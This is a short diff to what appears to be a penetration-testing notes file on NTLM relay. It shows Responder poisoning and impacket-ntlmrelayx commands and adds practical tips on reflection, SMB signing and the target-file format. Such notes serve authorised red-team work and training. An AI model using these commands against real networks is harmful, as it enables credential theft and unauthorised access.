@@ -56,3 +56,10 @@ sudo impacket-ntlmrelayx -tf targets.txt -smb2support
 # Term2 - Poisoning
 sudo responder -I wlan0 -dwF      # -d = inject WPAD via DHCP as well (tho much noise)
 ```
+
+### Gotchas
+
+- Host auth can't go back to itself (reflection died with MS08-068).
+  targets.txt must point at different hosts.
+- The target mustn't require SMB signing or relay dies.
+- targets.txt - one per line: smb://10.0.0.5, ldap://dc01, ...
